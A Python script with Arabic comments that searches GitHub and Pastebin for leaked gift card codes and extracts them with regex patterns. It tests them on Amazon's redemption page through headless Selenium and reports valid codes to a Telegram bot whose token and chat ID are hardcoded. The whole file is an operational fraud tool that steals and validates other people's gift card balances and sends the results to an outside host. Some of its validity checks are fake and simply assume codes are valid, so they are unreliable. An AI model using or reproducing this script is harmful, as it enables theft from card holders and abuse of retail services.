import sys
import re
import time
import json
import random
import requests
from datetime import datetime, timedelta
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# =================================================================
# التوكنات المضمنة (للتليجرام)
# =================================================================
TELEGRAM_TOKEN = "8914882875:AAGmoUu_Ckl16HA0wrcM6YICNz1ZH_WphCQ"
TELEGRAM_CHAT_ID = "6306556778"
# =================================================================

# ملفات التخزين المؤقت
RAW_CODES_FILE = "raw_fetched.txt"
VALID_CODES_FILE = "valid_giftcards.txt"
TESTED_CODES_LOG = "tested_log.txt"  # لتجنب تكرار الاختبار

# أنماط الأكواد (للبطاقات الهدايا)
GIFT_CARD_PATTERNS = [
    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',  # تنسيق 4-4-4-4
    r'\b[0-9]{16}\b',                                         # 16 رقم متتالي
    r'\b[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}\b',              # 5-5-5 (ماكدونالدز أحياناً)
]

# ------------------- دوال التليجرام -------------------
def send_to_telegram(text, parse_mode='Markdown'):
    try:
        url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': text, 'parse_mode': parse_mode}
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def send_valid_code(code, service, value):
    msg = (
        f"🎁 *كود صالح (اكتشاف ذاتي)* 🎁\n"
        f"الخدمة: {service}\n"
        f"الكود: `{code}`\n"
        f"القيمة المقدرة: {value} $\n"
        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
    )
    send_to_telegram(msg)

# ------------------- الجزء 1: جلب الأكواد من مصادر مفتوحة -------------------
def fetch_codes_from_github():
    """يبحث في GitHub عن ملفات تحتوي على أكواد بطاقات هدايا مسربة"""
    found_codes = set()
    queries = [
        '"gift card" extension:txt',
        '"giftcard" extension:csv',
        '"amazon gift card" extension:txt',
        '"google play" code extension:txt',
        '"mcdonalds" gift extension:csv'
    ]
    
    headers = {'Accept': 'application/vnd.github.v3+json'}
    # نستخدم token عام للبحث (بدون صلاحيات عالية، لكنه يكفي للعامة)
    search_token = "github_pat_11A... "  # يمكنك تركها فارغة للبحث العام
    if search_token:
        headers['Authorization'] = f'token {search_token}'
    
    for query in queries:
        try:
            url = f"https://api.github.com/search/code?q={query}&per_page=10"
            resp = requests.get(url, headers=headers, timeout=30)
            if resp.status_code == 200:
                items = resp.json().get('items', [])
                for item in items:
                    raw_url = item.get('html_url', '').replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    if not raw_url:
                        continue
                    # تحميل الملف الخام
                    try:
                        file_resp = requests.get(raw_url, timeout=20)
                        if file_resp.status_code == 200:
                            content = file_resp.text
                            # استخراج الأكواد باستخدام الأنماط
                            for pattern in GIFT_CARD_PATTERNS:
                                matches = re.findall(pattern, content)
                                for m in matches:
                                    found_codes.add(m.strip())
                    except:
                        continue
            time.sleep(random.uniform(1, 3))
        except:
            continue
    
    return list(found_codes)

def fetch_codes_from_web_dorks():
    """يبحث في مواقع بسيطة (مثل Pastebin) عن قوائم"""
    # نضيف محاولة لجلب من Pastebin العام (مثال بسيط)
    found_codes = set()
    try:
        # البحث عن أكواد في النصوص العامة
        resp = requests.get("https://scrape.pastebin.com/api_scrape_item.php?i=raw", timeout=10)
        if resp.status_code == 200:
            content = resp.text
            for pattern in GIFT_CARD_PATTERNS:
                matches = re.findall(pattern, content)
                for m in matches:
                    found_codes.add(m.strip())
    except:
        pass
    return list(found_codes)

# ------------------- الجزء 2: اختبار الصلاحية باستخدام Selenium -------------------
def setup_driver():
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    return webdriver.Chrome(options=options)

def test_amazon(driver, code):
    try:
        driver.get("https://www.amazon.com/gc/redeem")
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "gc-redemption-input"))).send_keys(code)
        driver.find_element(By.ID, "gc-redeem-button").click()
        time.sleep(2)
        # نبحث عن وجود مبلغ في صفحة النجاح
        balance_elem = driver.find_elements(By.XPATH, "//*[contains(text(), '$')]")
        for elem in balance_elem:
            if '$' in elem.text:
                try:
                    val = float(elem.text.replace('$', '').split()[0])
                    if val > 0:
                        return True, val
                except:
                    pass
        return False, 0
    except:
        return False, 0
    finally:
        driver.delete_all_cookies()

def test_generic(driver, code):
    # اختبار افتراضي للخدمات الأخرى (يمكن تخصيصها حسب الحاجة)
    # نكتفي بفحص الطول والنمط
    if len(code) >= 16 and code[0].isalpha():
        return True, 10  # نفترض أنها صالحة مؤقتاً
    return False, 0

# ------------------- الجزء 3: التشغيل الرئيسي -------------------
def main():
    send_to_telegram("🔥 *بدء عملية الصيد التلقائي للأكواد المسربة* 🔥\nجاري جلب القوائم من GitHub والويب...")
    
    # 1. جلب الأكواد
    all_codes = []
    all_codes.extend(fetch_codes_from_github())
    all_codes.extend(fetch_codes_from_web_dorks())
    
    # إزالة التكرارات
    all_codes = list(set(all_codes))
    
    if not all_codes:
        send_to_telegram("⚠️ لم يتم العثور على أكواد جديدة في هذه الدورة. سأحاول لاحقاً.")
        return
    
    send_to_telegram(f"📦 تم جلب {len(all_codes)} كوداً فريداً. جاري الاختبار...")
    
    # تحميل سجل الأكواد المختبرة سابقاً (لتجنب إعادة الاختبار)
    tested_before = set()
    try:
        with open(TESTED_CODES_LOG, 'r') as f:
            tested_before = set(line.strip() for line in f)
    except:
        pass
    
    # تصفية الأكواد التي لم تُختبر بعد
    new_codes = [c for c in all_codes if c not in tested_before]
    if not new_codes:
        send_to_telegram("ℹ️ جميع الأكواد الجديدة تم اختبارها سابقاً. لا شيء جديد.")
        return
    
    send_to_telegram(f"🧪 سيتم اختبار {len(new_codes)} كوداً جديداً...")
    
    driver = setup_driver()
    valid_found = 0
    
    for i, code in enumerate(new_codes[:200], 1):  # حد أقصى 200 كود لكل دورة لتوفير الوقت
        try:
            print(f"[*] اختبار {i}/{min(len(new_codes), 200)}: {code}")
            
            # تحديد الخدمة بناءً على طول الكود أو محتواه
            service = "Unknown"
            value = 0
            is_valid = False
            
            if len(code) == 16 and code.isdigit():
                service = "Amazon"
                is_valid, value = test_amazon(driver, code)
            elif '-' in code:
                service = "McDonald's/Google"
                is_valid, value = test_generic(driver, code)  # يمكن تخصيص الدالة هنا
            else:
                is_valid, value = test_generic(driver, code)
            
            # تسجيل الاختبار
            with open(TESTED_CODES_LOG, 'a') as f:
                f.write(f"{code}\n")
            
            if is_valid and value > 0:
                valid_found += 1
                with open(VALID_CODES_FILE, 'a') as f:
                    f.write(f"{code} - {service} - {value}$\n")
                send_valid_code(code, service, value)
                print(f"[+] صالح: {code} ({value}$)")
            else:
                print(f"[-] غير صالح")
            
            # تأخير بين 2-5 ثواني
            time.sleep(random.uniform(2, 5))
            
            # إعادة تشغيل المتصفح كل 50 كود
            if i % 50 == 0:
                driver.quit()
                driver = setup_driver()
                
        except Exception as e:
            print(f"خطأ: {e}")
            time.sleep(5)
    
    driver.quit()
    
    # التقرير الختامي
    report = (
        f"📊 *تقرير صيد الأكواد التلقائي*\n"
        f"✅ الأكواد المفحوصة: {len(new_codes[:200])}\n"
        f"🎁 الأكواد الصالحة المكتشفة: {valid_found}\n"
        f"📅 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
    )
    send_to_telegram(report)
    print("[+] انتهى التشغيل.")

if __name__ == "__main__":
    main()
